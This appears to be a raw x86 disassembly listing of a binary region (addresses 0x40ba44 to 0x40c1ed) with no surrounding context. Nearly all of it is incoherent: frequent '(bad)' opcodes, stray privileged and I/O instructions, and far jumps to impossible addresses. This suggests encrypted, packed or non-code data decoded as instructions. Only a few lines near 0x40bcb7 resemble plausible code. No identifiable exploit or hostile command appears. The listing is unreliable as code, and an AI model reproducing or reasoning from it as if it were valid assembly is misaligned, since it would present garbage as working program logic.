  40ba44:	xor    eax,0x6a4fc8ea
  40ba49:	inc    esp
  40ba4a:	mov    BYTE PTR [esi],bl
  40ba4c:	push   cs
  40ba4d:	fild   WORD PTR [eax+0x5b]
  40ba50:	aam    0x41
  40ba52:	lock sub DWORD PTR [edx],0x7b
  40ba56:	jne    0x40ba6a
  40ba58:	mov    ds:0xe7d71dc4,al
  40ba5d:	loope  0x40bab7
  40ba5f:	int    0x26
  40ba61:	and    eax,0x7272654b
  40ba66:	sub    esp,DWORD PTR [ecx-0x14ced5ac]
  40ba6c:	in     eax,dx
  40ba6d:	xor    DWORD PTR [edi],eax
  40ba6f:	xchg   DWORD PTR [eax-0x5b30a828],ecx
  40ba75:	push   ebp
  40ba76:	pop    eax
  40ba77:	mov    ebx,0x6c3386df
  40ba7c:	(bad)  
  40ba7e:	push   0x2b6f03a4
  40ba83:	hlt    
  40ba84:	cmp    eax,0x7f3634b0
  40ba89:	jge    0x40ba1a
  40ba8b:	mov    esi,DWORD PTR [ecx-0x7e]
  40ba8e:	inc    edi
  40ba8f:	add    bl,BYTE PTR [edx-0x2e]
  40ba92:	push   cs
  40ba93:	ja     0x40bafc
  40ba95:	pop    di
  40ba97:	mov    ebp,0xc808959a
  40ba9c:	mov    ch,0x66
  40ba9e:	dec    edx
  40ba9f:	and    al,0x4
  40baa1:	push   ds
  40baa2:	add    eax,0xfc623c99
  40baa7:	jnp    0x40ba38
  40baa9:	idiv   BYTE PTR [esi+0x17]
  40baac:	or     al,0x44
  40baae:	sbb    edx,ecx
  40bab0:	(bad)  
  40bab1:	fldenv [ebx-0x65]
  40bab4:	jb     0x40bac7
  40bab6:	(bad)  
  40bab7:	les    edi,FWORD PTR [edx-0x1500e70]
  40babd:	lods   eax,DWORD PTR ds:[esi]
  40babe:	retf   
  40babf:	std    
  40bac0:	xchg   edi,eax
  40bac1:	push   cs
  40bac2:	push   ebx
  40bac3:	sti    
  40bac4:	lea    eax,[edi]
  40bac6:	into   
  40bac7:	cli    
  40bac8:	mov    dl,BYTE PTR [edx+ebx*2-0x2608bed8]
  40bacf:	jle    0x40bae2
  40bad1:	clc    
  40bad2:	dec    edx
  40bad3:	in     eax,0x62
  40bad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad6:	popf   
  40bad7:	stos   BYTE PTR es:[edi],al
  40bad8:	lea    ebx,[edi+edx*2]
  40badb:	jmp    0xeaa130cf
  40bae0:	leave  
  40bae1:	or     al,0x3b
  40bae3:	aas    
  40bae4:	out    dx,al
  40bae5:	push   0x20
  40bae7:	(bad)
  40baea:	push   ecx
  40baeb:	mov    WORD PTR [edx],gs
  40baed:	xor    BYTE PTR [ecx+0x29],ch
  40baf0:	cdq    
  40baf1:	in     eax,0x86
  40baf3:	stos   DWORD PTR es:[edi],eax
  40baf4:	xchg   esp,eax
  40baf5:	(bad)  
  40baf6:	int    0x9c
  40baf8:	inc    eax
  40baf9:	sub    edx,DWORD PTR [ecx+0x6a]
  40bafc:	fsub   QWORD PTR [eax-0x7d378d2f]
  40bb02:	fwait
  40bb03:	push   edx
  40bb04:	(bad)  
  40bb05:	jae    0x40bab4
  40bb07:	cld    
  40bb08:	push   ecx
  40bb09:	loope  0x40bb13
  40bb0b:	push   ebx
  40bb0c:	pop    ebp
  40bb0d:	mov    ds:0x8fd53e18,eax
  40bb12:	or     DWORD PTR [esi+0x6414b974],esi
  40bb18:	jp     0x40bb62
  40bb1a:	inc    esi
  40bb1b:	test   BYTE PTR [ebx+ecx*2+0x2691dcbd],cl
  40bb22:	mov    ecx,0x69c14134
  40bb27:	popf   
  40bb28:	and    ah,dl
  40bb2a:	call   0x2904:0xd1467f75
  40bb31:	es in  al,dx
  40bb33:	dec    ebp
  40bb34:	add    eax,0xf6736a2
  40bb39:	mov    ecx,0xddc168ff
  40bb3e:	cs in  al,0xf5
  40bb41:	pop    ss
  40bb42:	je     0x40bb4e
  40bb44:	(bad)  [edi]
  40bb46:	in     al,dx
  40bb47:	pop    eax
  40bb48:	fwait
  40bb49:	xor    ebx,0xc8c2b8bd
  40bb4f:	push   esi
  40bb50:	xchg   BYTE PTR [ecx-0x5a],bh
  40bb53:	fcom   st(4)
  40bb55:	xor    ecx,esi
  40bb57:	inc    esi
  40bb58:	adc    eax,0xd328e439
  40bb5d:	push   eax
  40bb5e:	repnz adc edi,0x49
  40bb62:	xchg   DWORD PTR [ebp+0x2b],esi
  40bb65:	pusha  
  40bb66:	loopne 0x40bb82
  40bb68:	call   0x1df5:0x5c7ee77c
  40bb6f:	test   DWORD PTR [edx-0x2],0xdf0c2172
  40bb76:	sar    BYTE PTR [esi+ebx*4],0x92
  40bb7a:	(bad)  
  40bb7b:	pop    eax
  40bb7c:	mov    dh,0x61
  40bb7e:	sbb    eax,0x9a5f20b2
  40bb83:	aam    0x2d
  40bb85:	sub    eax,0xb6eeef76
  40bb8a:	pop    es
  40bb8b:	mov    al,0xf0
  40bb8d:	dec    eax
  40bb8e:	and    BYTE PTR ds:0xc318bce0,dl
  40bb94:	push   ss
  40bb95:	mov    ecx,0x9bb5bf97
  40bb9a:	iret   
  40bb9b:	vhaddps xmm4,xmm5,XMMWORD PTR [ecx]
  40bb9f:	(bad)  
  40bba0:	in     eax,0x8b
  40bba2:	mov    dh,0xfb
  40bba4:	lods   al,BYTE PTR ss:[esi]
  40bba6:	retf   0x6b23
  40bba9:	data16 and BYTE PTR [esi-0x34eb195e],ah
  40bbb0:	pop    esp
  40bbb1:	jo     0x40bc1e
  40bbb3:	and    ecx,esi
  40bbb5:	repz imul ebp,DWORD PTR es:[ebx-0x40c59fe9],0x97b4efd3
  40bbc1:	call   0x4bebe91f
  40bbc6:	ss (bad) 
  40bbc9:	mov    bh,0x9f
  40bbcb:	sar    ebp,1
  40bbcd:	into   
  40bbce:	addr16 in eax,dx
  40bbd0:	mov    dh,0xa2
  40bbd2:	lock out dx,al
  40bbd4:	push   ss
  40bbd5:	mov    eax,0x17fe356b
  40bbda:	loopne 0x40bc41
  40bbdc:	stos   DWORD PTR es:[edi],eax
  40bbdd:	sub    ebp,eax
  40bbdf:	imul   esi,DWORD PTR [esi+0x4e],0xc88dbd8a
  40bbe6:	pop    edi
  40bbe7:	add    DWORD PTR [edx+0x2b],ebx
  40bbea:	(bad)
  40bbee:	xchg   edi,eax
  40bbef:	adc    ebp,DWORD PTR [edi]
  40bbf1:	and    eax,0xa1825c12
  40bbf6:	push   edi
  40bbf7:	enter  0x3ee7,0xd6
  40bbfb:	add    al,0x6f
  40bbfd:	and    ah,BYTE PTR ds:0xb0950d8f
  40bc03:	or     DWORD PTR [ebx],edi
  40bc05:	jbe    0x40bbad
  40bc07:	(bad)  
  40bc08:	or     DWORD PTR [edi-0x13773c39],esi
  40bc0e:	dec    ebp
  40bc0f:	sub    al,ah
  40bc11:	sub    al,0x1d
  40bc14:	ds mov al,0xc3
  40bc17:	jmp    0x2f03:0xe775d2d6
  40bc1e:	inc    esp
  40bc1f:	lahf   
  40bc20:	mov    bl,0xe4
  40bc22:	add    edi,esp
  40bc24:	ins    BYTE PTR es:[edi],dx
  40bc25:	fwait
  40bc26:	arpl   WORD PTR [ecx],di
  40bc28:	and    ah,BYTE PTR [edx+ebp*2+0x68]
  40bc2c:	dec    eax
  40bc2d:	test   eax,0x18551303
  40bc32:	repz fwait
  40bc34:	ss sub eax,0xda034a2b
  40bc3a:	fstp   DWORD PTR [ecx-0x5a]
  40bc3d:	sub    al,ch
  40bc3f:	ret    
  40bc40:	xor    esi,ebx
  40bc42:	out    dx,al
  40bc43:	and    esi,DWORD PTR [edi]
  40bc45:	int3   
  40bc46:	pop    ecx
  40bc47:	jmp    0x5979:0x55a8a10b
  40bc4e:	mov    bl,0x93
  40bc50:	retf   
  40bc51:	sahf   
  40bc52:	inc    ecx
  40bc53:	cmp    al,0xac
  40bc55:	inc    ebp
  40bc56:	dec    ebp
  40bc57:	rcr    BYTE PTR [edx+0x6b],cl
  40bc5a:	stos   DWORD PTR es:[edi],eax
  40bc5b:	or     BYTE PTR [ebx+0x26],0xab
  40bc5f:	out    0x59,al
  40bc61:	pop    esp
  40bc62:	inc    eax
  40bc63:	or     DWORD PTR ds:0x62249e21,ecx
  40bc69:	mov    bl,BYTE PTR [edi+0x22eb29b1]
  40bc6f:	cld    
  40bc70:	call   0xfec2d343
  40bc75:	cmp    eax,0xe1970099
  40bc7a:	ss loopne 0x40bc25
  40bc7d:	call   0x5f48c73b
  40bc82:	lea    eax,[ebx+0x5f5ccffe]
  40bc88:	shl    BYTE PTR ds:0x93d45c1e,0xa8
  40bc8f:	lahf   
  40bc90:	jne    0x40bc1f
  40bc92:	cmp    bh,BYTE PTR [ebx]
  40bc94:	dec    esi
  40bc95:	jb     0x40bc41
  40bc97:	or     BYTE PTR [ebx-0x592634f0],bl
  40bc9d:	fadd   QWORD PTR [edx+0x245772b8]
  40bca3:	iret   
  40bca4:	xor    ebp,esp
  40bca6:	adc    DWORD PTR [eax+0x21],esi
  40bca9:	imul   BYTE PTR [ebx]
  40bcab:	fistp  QWORD PTR [ebx]
  40bcad:	fimul  DWORD PTR [ebx-0x79f037ab]
  40bcb3:	add    eax,DWORD PTR [eax]
  40bcb5:	add    BYTE PTR [eax],al
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	jp     0x40bc90
  40bcd4:	hlt    
  40bcd5:	retf   
  40bcd6:	in     al,0x8e
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	call   0xf6c3696c
  40bce3:	sub    bl,cl
  40bce5:	stos   DWORD PTR es:[edi],eax
  40bce6:	ja     0x40bd2d
  40bce8:	xchg   esp,eax
  40bce9:	inc    esp
  40bcea:	cmp    bh,0xd0
  40bced:	pop    edi
  40bcee:	(bad)  
  40bcef:	sti    
  40bcf0:	jl     0x40bd31
  40bcf2:	sub    eax,eax
  40bcf4:	adc    DWORD PTR [edx+0x28],eax
  40bcf7:	imul   BYTE PTR [edi-0x27]
  40bcfa:	cmp    eax,0x769d8abd
  40bcff:	sub    ebx,esi
  40bd01:	dec    edx
  40bd02:	(bad)  
  40bd03:	jp     0x40bcb9
  40bd05:	cmp    DWORD PTR [edx],0x6e
  40bd08:	cmc    
  40bd09:	or     DWORD PTR [eax-0x7d68da3d],0x18ee05af
  40bd13:	xchg   BYTE PTR [ebx-0x5d0ee89b],dl
  40bd19:	sub    dl,BYTE PTR [ebx+ecx*1]
  40bd1c:	jle    0xf07c564f
  40bd22:	mov    ebp,0x8ae5e1ff
  40bd27:	push   edx
  40bd28:	mov    ebp,0x8e368f9a
  40bd2d:	ja     0x40bce1
  40bd2f:	mov    dh,0x9e
  40bd31:	add    BYTE PTR [esi-0x307a60a0],dl
  40bd37:	addr16 popf 
  40bd39:	jecxz  0x40bccf
  40bd3b:	ror    BYTE PTR [edx],1
  40bd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd3e:	cmp    eax,0x7f70937f
  40bd43:	sub    BYTE PTR [esp+ecx*2-0x62269db],bl
  40bd4a:	mov    bh,0x9e
  40bd4c:	jge    0x40bd88
  40bd4e:	cmc    
  40bd4f:	loopne 0x40bd7b
  40bd51:	js     0x40bd0c
  40bd53:	dec    ebp
  40bd54:	iret   
  40bd55:	xor    ebx,esp
  40bd57:	dec    ecx
  40bd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd59:	mov    edx,esi
  40bd5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd5c:	ficomp DWORD PTR [ebx+eiz*8]
  40bd5f:	nop
  40bd60:	add    BYTE PTR [ebp+0x62cd43b2],dh
  40bd66:	ss jo  0x40bdc8
  40bd69:	sub    esi,DWORD PTR [edi+0x3643b8ec]
  40bd6f:	push   edi
  40bd70:	adc    al,0x1b
  40bd72:	daa    
  40bd73:	outs   dx,BYTE PTR ds:[esi]
  40bd74:	icebp  
  40bd75:	cmp    ecx,esi
  40bd77:	mov    eax,0xc4272c15
  40bd7c:	into   
  40bd7d:	xchg   ebp,eax
  40bd7e:	(bad)  
  40bd80:	sub    DWORD PTR [esi*4+0x2d85eea5],ebx
  40bd87:	xor    ch,BYTE PTR [edi+0x0]
  40bd8a:	cwde   
  40bd8b:	sbb    BYTE PTR [ebx-0x3624f638],bh
  40bd91:	add    dl,al
  40bd93:	js     0x40bd4b
  40bd95:	test   BYTE PTR [ebx],al
  40bd97:	jg     0x40bd6d
  40bd99:	mov    DWORD PTR [edx-0x43b5e49d],0x13023c24
  40bda3:	mov    ecx,0xa0809e59
  40bda8:	xchg   edi,eax
  40bda9:	mov    dl,dh
  40bdab:	mov    ebx,esp
  40bdad:	pop    ss
  40bdae:	fbld   TBYTE PTR [edi-0x14]
  40bdb1:	push   ebp
  40bdb2:	adc    ecx,DWORD PTR [eax-0x47]
  40bdb5:	ja     0x40be0b
  40bdb7:	adc    al,0xc8
  40bdb9:	rcr    BYTE PTR [ecx+0x1d],0x29
  40bdbd:	adc    BYTE PTR [ecx],ah
  40bdbf:	cld    
  40bdc0:	mov    esi,0xa5a5621a
  40bdc5:	clc    
  40bdc6:	jo     0x40bd95
  40bdc8:	jnp    0x40bd52
  40bdca:	sub    cl,BYTE PTR [esi+0x23]
  40bdcd:	ds or  al,0x71
  40bdd0:	stc    
  40bdd1:	sub    BYTE PTR [ebp-0x4795db4b],ah
  40bdd7:	(bad)  
  40bdd8:	jbe    0x40bd5c
  40bdda:	ss pop ebp
  40bddc:	xchg   edx,eax
  40bddd:	dec    eax
  40bdde:	repz adc edx,DWORD PTR [esi+0x61]
  40bde2:	test   BYTE PTR fs:[ebx-0x2c],ch
  40bde6:	jmp    FWORD PTR [edi+0x28c41079]
  40bdec:	gs int 0x34
  40bdef:	xor    ebp,ebx
  40bdf1:	jg     0x40be1a
  40bdf3:	xor    bh,BYTE PTR [edi+edi*2]
  40bdf6:	dec    esi
  40bdf7:	mov    dl,bl
  40bdf9:	jb     0x40be06
  40bdfb:	int    0x44
  40bdfd:	scas   al,BYTE PTR es:[edi]
  40bdfe:	sbb    al,0x88
  40be00:	xchg   esi,eax
  40be01:	fdiv   QWORD PTR [ebx+0x6c]
  40be04:	mov    edi,0x508746f3
  40be09:	stc    
  40be0a:	ins    BYTE PTR es:[edi],dx
  40be0b:	jno    0x40be61
  40be0d:	lods   al,BYTE PTR ds:[esi]
  40be0e:	aas    
  40be0f:	adc    al,0xdc
  40be11:	sbb    al,BYTE PTR [edx-0x15e5ab27]
  40be17:	pop    ebp
  40be18:	lea    edi,ds:0x1b362c05
  40be1e:	rcl    ebx,0xd7
  40be21:	dec    ecx
  40be22:	rol    DWORD PTR [edx-0x69],1
  40be25:	pmulhw mm4,mm4
  40be28:	shl    edx,cl
  40be2a:	test   BYTE PTR [eax-0x59],0x89
  40be2e:	add    ch,BYTE PTR [edx]
  40be30:	push   ecx
  40be31:	out    0xae,eax
  40be33:	push   ss
  40be34:	imul   esp,DWORD PTR ds:0xca2ab072,0x95674907
  40be3e:	lods   al,BYTE PTR ds:[esi]
  40be3f:	test   BYTE PTR [edi-0x12],ah
  40be42:	data16 sbb ah,BYTE PTR [ebx-0x19525461]
  40be49:	mov    eax,ds:0xad6ed8db
  40be4e:	out    0xd6,eax
  40be50:	dec    ebx
  40be52:	or     DWORD PTR [ebx+0x1a],edx
  40be55:	in     eax,dx
  40be56:	int3   
  40be57:	add    edi,DWORD PTR [ecx]
  40be59:	push   edi
  40be5a:	adc    al,dl
  40be5c:	ret    
  40be5d:	mov    ds:0x1200bf29,al
  40be62:	add    al,0x4
  40be64:	fistp  DWORD PTR [edx-0x50dcca96]
  40be6a:	or     eax,0xe4810111
  40be6f:	pop    es
  40be70:	mov    ah,0x3c
  40be72:	dec    esp
  40be73:	dec    edx
  40be74:	sbb    al,0x30
  40be76:	loopne 0x40be43
  40be78:	pop    ebp
  40be79:	xchg   edx,eax
  40be7a:	cwde   
  40be7b:	(bad)  
  40be7c:	jmp    DWORD PTR ds:0x75329723
  40be82:	ds loop 0x40be93
  40be85:	fcomp  DWORD PTR [ebp+0x23]
  40be88:	adc    BYTE PTR [eax-0x23ab7385],0x5e
  40be8f:	push   cs
  40be90:	test   eax,0xa8bf9644
  40be95:	xor    DWORD PTR [ebx+0x1a98f02e],edi
  40be9b:	dec    ebx
  40be9c:	js     0x40be5b
  40be9e:	xchg   ebp,eax
  40be9f:	shl    BYTE PTR [eax-0x1285274],1
  40bea5:	aaa    
  40bea6:	jmp    0x40be97
  40bea8:	sub    al,0xe3
  40beaa:	(bad)  
  40beab:	fild   DWORD PTR [esi]
  40bead:	add    BYTE PTR [ebp+0x4e714b6b],dh
  40beb3:	aam    0x53
  40beb5:	cdq    
  40beb6:	mov    ds:0xa07319db,al
  40bebb:	cmp    esi,DWORD PTR [ecx]
  40bebd:	cmp    ebx,esp
  40bebf:	jnp    0x40be55
  40bec1:	lds    eax,FWORD PTR [edi-0x6e122895]
  40bec7:	pop    ecx
  40bec8:	adc    al,0x97
  40beca:	mov    ecx,0xbf3efd22
  40becf:	repz and DWORD PTR [ebx],ebx
  40bed2:	jnp    0x40bef8
  40bed4:	xor    al,0xd1
  40bed6:	loopne 0x40beb5
  40bed8:	loope  0x40bf4d
  40beda:	out    dx,al
  40bedb:	xchg   BYTE PTR [eax+0x735a5299],al
  40bee1:	adc    DWORD PTR [esi+0xd],0x9410fe4a
  40bee8:	int3   
  40bee9:	stos   BYTE PTR es:[edi],al
  40beea:	test   eax,0x897e2732
  40beef:	mov    es,WORD PTR [ebp+0x7a]
  40bef2:	iret   
  40bef3:	add    bl,BYTE PTR [esi]
  40bef5:	dec    eax
  40bef6:	mov    ds:0x9495c80e,al
  40befb:	jp     0x40bea8
  40befd:	xchg   ebx,eax
  40befe:	arpl   WORD PTR [esi],di
  40bf00:	lahf   
  40bf01:	sbb    edi,edi
  40bf03:	inc    esp
  40bf04:	mov    esp,0x658b65ce
  40bf09:	idiv   BYTE PTR ds:0xca1af8b2
  40bf0f:	hlt    
  40bf10:	sahf   
  40bf11:	popa   
  40bf12:	fwait
  40bf13:	ins    BYTE PTR es:[edi],dx
  40bf14:	ffree  st(2)
  40bf16:	es jno 0x40bef9
  40bf19:	add    al,0x76
  40bf1b:	fisubr DWORD PTR [edi+0x34]
  40bf1e:	(bad)  
  40bf20:	cmp    cl,BYTE PTR [eax-0x28]
  40bf23:	and    ebx,esp
  40bf25:	retf   
  40bf26:	clc    
  40bf27:	lods   al,BYTE PTR ds:[esi]
  40bf28:	mov    ds:0xd8ad8ea0,al
  40bf2d:	xchg   edx,eax
  40bf2e:	inc    ebp
  40bf2f:	in     eax,dx
  40bf30:	mov    al,0xad
  40bf32:	and    cl,BYTE PTR [edx]
  40bf34:	rol    BYTE PTR [ecx-0x47],0x91
  40bf38:	repz cli 
  40bf3a:	stos   DWORD PTR es:[edi],eax
  40bf3b:	bnd ds jbe 0x40bf87
  40bf3f:	or     al,0xec
  40bf41:	xor    DWORD PTR [ebx-0x697a07c7],ebx
  40bf47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf48:	fistp  QWORD PTR [ebx-0x32]
  40bf4b:	push   eax
  40bf4c:	(bad)  
  40bf4d:	popf   
  40bf4e:	xor    eax,0xb133206c
  40bf53:	mov    esp,0x6038a759
  40bf58:	mov    dh,0xd0
  40bf5a:	xor    BYTE PTR [esi+ecx*8+0x6cd89e15],0xa5
  40bf62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf63:	xlat   BYTE PTR ds:[ebx]
  40bf64:	lock inc edi
  40bf66:	push   ebx
  40bf67:	xchg   edi,eax
  40bf68:	xor    bh,BYTE PTR [edi-0x24]
  40bf6b:	test   DWORD PTR [edx],0xe5693b22
  40bf71:	mov    ecx,0x7069c8cd
  40bf76:	mov    al,0x28
  40bf78:	dec    edi
  40bf79:	dec    edx
  40bf7a:	daa    
  40bf7b:	jno    0x40bf5b
  40bf7d:	(bad)  
  40bf7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf7f:	ins    DWORD PTR es:[edi],dx
  40bf80:	xchg   esi,eax
  40bf81:	outs   dx,DWORD PTR ds:[esi]
  40bf82:	das    
  40bf83:	lea    esp,[ebx]
  40bf85:	pop    ds
  40bf86:	imul   edi,esi,0xc777474b
  40bf8c:	or     al,0x2f
  40bf8e:	and    eax,0xe4da878f
  40bf93:	popf   
  40bf94:	popf   
  40bf95:	sahf   
  40bf96:	fdiv   st(2),st
  40bf98:	sti    
  40bf99:	inc    edx
  40bf9a:	xlat   BYTE PTR ds:[ebx]
  40bf9b:	adc    eax,ecx
  40bf9d:	(bad)  
  40bf9e:	dec    esp
  40bfa0:	mov    esi,0xe7e747dd
  40bfa5:	mov    ds:0xbac1cc17,al
  40bfaa:	xchg   BYTE PTR [eax+0x6c],ah
  40bfad:	fstp   TBYTE PTR [eax-0x61ba30b9]
  40bfb3:	adc    DWORD PTR [edi+0x626c3ffd],edi
  40bfb9:	mov    ecx,0x3513eb59
  40bfbe:	dec    ebx
  40bfbf:	js     0x40bffc
  40bfc1:	ret    
  40bfc2:	aaa    
  40bfc3:	cmp    cl,dl
  40bfc5:	dec    ebp
  40bfc6:	sbb    ch,BYTE PTR [ebp-0x54]
  40bfc9:	pop    eax
  40bfca:	mov    ah,0xad
  40bfcc:	xlat   BYTE PTR ds:[ebx]
  40bfcd:	push   esp
  40bfce:	dec    esi
  40bfcf:	inc    ebp
  40bfd0:	mov    eax,ds:0x59d6146b
  40bfd5:	(bad)  
  40bfd8:	shl    DWORD PTR [esi],cl
  40bfda:	(bad)  
  40bfdb:	outs   dx,BYTE PTR ds:[esi]
  40bfdc:	xor    al,BYTE PTR [edx]
  40bfde:	loop   0x40c03c
  40bfe0:	sahf   
  40bfe1:	imul   esp,esp,0x94616f7b
  40bfe7:	arpl   WORD PTR [ebx-0x61],ax
  40bfea:	mov    esp,0x765ac619
  40bfef:	xor    al,BYTE PTR [ebp-0xf]
  40bff2:	iret   
  40bff3:	cmp    BYTE PTR ds:0xa2320e54,dh
  40bff9:	and    DWORD PTR [eax],0x5b
  40bffc:	and    al,0x91
  40bffe:	std    
  40bfff:	push   edx
  40c000:	cmp    cl,BYTE PTR [eax]
  40c002:	mov    WORD PTR [eax-0x630b987b],gs
  40c008:	xor    eax,0xc040f412
  40c00d:	fld    TBYTE PTR [ebx+0x166d5d3a]
  40c013:	xor    bl,BYTE PTR [ecx-0x67ee26f2]
  40c019:	xor    dh,dl
  40c01b:	sub    edx,DWORD PTR fs:[edx+eax*1]
  40c01f:	xor    eax,0xb9255c0c
  40c024:	out    0x33,eax
  40c026:	adc    esi,DWORD PTR [eax+0x40]
  40c029:	das    
  40c02a:	or     al,0x76
  40c02d:	loop   0x40c059
  40c02f:	mov    ds:0xf1d423ba,eax
  40c034:	xor    bh,BYTE PTR [ebx]
  40c036:	loop   0x40bfb9
  40c038:	push   ebx
  40c039:	push   ebx
  40c03a:	xchg   DWORD PTR [edi],esp
  40c03c:	and    al,0x7d
  40c03e:	jmp    0xc411:0x518de4fb
  40c045:	in     al,dx
  40c046:	shl    BYTE PTR [ebx+0x69cb881b],0x8e
  40c04d:	outs   dx,BYTE PTR ds:[esi]
  40c04e:	(bad)  
  40c050:	mov    bl,0x9f
  40c052:	test   BYTE PTR [ecx+ebx*4],ch
  40c055:	scas   al,BYTE PTR es:[edi]
  40c056:	popa   
  40c057:	bound  edx,QWORD PTR [edi-0x6cf28403]
  40c05d:	jl     0x40c04c
  40c05f:	out    0x5b,al
  40c061:	cdq    
  40c062:	add    eax,0x83e76da2
  40c067:	dec    ecx
  40c068:	xchg   esp,eax
  40c069:	jl     0x40c09b
  40c06b:	mov    ah,dl
  40c06d:	hlt    
  40c06e:	imul   ebx,DWORD PTR [esp+edx*4+0x492c7185],0xd928b6dd
  40c079:	outs   dx,DWORD PTR ds:[esi]
  40c07a:	fbstp  TBYTE PTR [eax-0x6068dadd]
  40c080:	mov    fs,esi
  40c082:	popf   
  40c083:	jle    0x40c0e8
  40c085:	sub    al,0xb5
  40c087:	mov    BYTE PTR [edi],dh
  40c089:	pushf  
  40c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c08b:	or     dh,BYTE PTR [eax]
  40c08d:	out    0xdf,eax
  40c08f:	sbb    DWORD PTR [edx+edi*1+0x5c81e8aa],edx
  40c096:	xor    DWORD PTR [esi],edx
  40c098:	int    0xe1
  40c09a:	xor    ecx,DWORD PTR [ecx]
  40c09c:	push   0xffffffc6
  40c09e:	inc    ebx
  40c09f:	inc    eax
  40c0a0:	outs   dx,BYTE PTR ds:[esi]
  40c0a1:	jge    0x40c08a
  40c0a3:	enter  0xf4cf,0xc3
  40c0a7:	and    BYTE PTR [ecx+0x2b54c14e],0xf9
  40c0ae:	jge    0x40c0f0
  40c0b0:	scas   eax,DWORD PTR es:[edi]
  40c0b1:	mov    edx,0x286f4f3b
  40c0b6:	add    BYTE PTR [ecx],bh
  40c0b8:	mov    al,ds:0x680f9c91
  40c0bd:	fisub  WORD PTR ds:0x252c44f5
  40c0c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0c4:	dec    eax
  40c0c5:	sub    ah,BYTE PTR [edi+0x7ba66a9f]
  40c0cb:	jns    0x40c115
  40c0cd:	sub    dh,bh
  40c0cf:	sub    BYTE PTR [eax-0x3d8956dc],bl
  40c0d5:	scas   al,BYTE PTR es:[edi]
  40c0d6:	mov    ah,0xdf
  40c0d8:	add    edi,ecx
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rol    dh,1
  40c0ee:	hlt    
  40c0ef:	mov    ecx,0x7e8ade4b
  40c0f4:	jle    0x40c166
  40c0f6:	jns    0x40c176
  40c0f8:	jle    0x40c167
  40c0fa:	sub    BYTE PTR [ebp-0x27],dl
  40c0fd:	das    
  40c0fe:	pop    esp
  40c0ff:	inc    DWORD PTR [ebx+ebp*1]
  40c102:	push   eax
  40c103:	test   edi,0xcc7d6fb3
  40c109:	mov    esp,0xda12548f
  40c10e:	mov    WORD PTR [ebx+eiz*1-0x7eebfc2b],fs
  40c115:	mov    al,0x57
  40c117:	xchg   ebx,eax
  40c118:	xor    eax,0x8720c5fe
  40c11d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c11e:	mov    edx,0x9347d82
  40c123:	sbb    al,0x9d
  40c125:	(bad)  
  40c126:	cli    
  40c127:	cmp    al,0xa8
  40c129:	je     0x40c17c
  40c12b:	xor    ah,BYTE PTR [ebx-0x45]
  40c12e:	push   ss
  40c12f:	test   DWORD PTR [ebx+0x7eceeaa7],0xdcc4485b
  40c139:	xor    DWORD PTR [edi+ecx*2],0x17
  40c13d:	sub    ch,BYTE PTR [esi-0x69663b91]
  40c143:	add    esp,ecx
  40c145:	fnsave [ebx+0x57]
  40c148:	mov    ds:0x1766ed84,al
  40c14d:	sub    eax,0xb0f8d401
  40c152:	push   ecx
  40c153:	loop   0x40c1d0
  40c155:	fcomp  DWORD PTR ss:[edx+0x21490949]
  40c15c:	outs   dx,BYTE PTR ds:[esi]
  40c15d:	push   edi
  40c15e:	push   0xffffffc6
  40c160:	mov    esi,0xbe8750fb
  40c165:	test   al,0xa8
  40c167:	shr    BYTE PTR ds:0xb2682918,cl
  40c16d:	mov    ecx,0x6aefafc2
  40c172:	imul   ecx,DWORD PTR [eax],0x41
  40c175:	popa   
  40c176:	push   edi
  40c177:	repnz out dx,al
  40c179:	push   ds
  40c17a:	fld    QWORD PTR [edx-0x40e1ee25]
  40c180:	push   eax
  40c181:	lock mov ebp,0x29d6671
  40c187:	cmp    DWORD PTR [edi+ecx*8],0x9506cfaa
  40c18e:	daa    
  40c18f:	xchg   ecx,eax
  40c190:	cli    
  40c191:	idiv   DWORD PTR [edx-0x72]
  40c194:	mov    al,ds:0x43da6257
  40c199:	daa    
  40c19a:	out    0x50,al
  40c19c:	sub    al,0x5b
  40c19f:	popa   
  40c1a0:	adc    eax,0xe23f6cf
  40c1a5:	push   0x45
  40c1a7:	iret   
  40c1a8:	pop    esi
  40c1a9:	in     al,0x87
  40c1ab:	pop    ebp
  40c1ac:	cmp    ah,cl
  40c1ae:	or     eax,0xf67e26b1
  40c1b3:	ins    DWORD PTR es:[edi],dx
  40c1b4:	xchg   BYTE PTR [esi-0x4a],dl
  40c1b7:	je     0x40c21e
  40c1b9:	aas    
  40c1ba:	mov    eax,ds:0x26191d2c
  40c1bf:	fstp   DWORD PTR [edi]
  40c1c1:	shl    BYTE PTR [eax+0x7eb7012f],0x50
  40c1c8:	rol    DWORD PTR es:[edx],0xef
  40c1cc:	popf   
  40c1cd:	int    0x66
  40c1cf:	jne    0x40c218
  40c1d1:	aaa    
  40c1d2:	js     0x40c1e0
  40c1d4:	and    BYTE PTR ds:0x24fbbd8d,ah
  40c1da:	jne    0x40c1a0
  40c1dc:	aaa    
  40c1dd:	arpl   WORD PTR [esi-0x1992b213],ax
  40c1e3:	call   0xcb3c:0x21016480
  40c1ea:	inc    edx
  40c1eb:	loopne 0x40c20e
  40c1ed:	repz adc DWORD PTR [ebx],edi
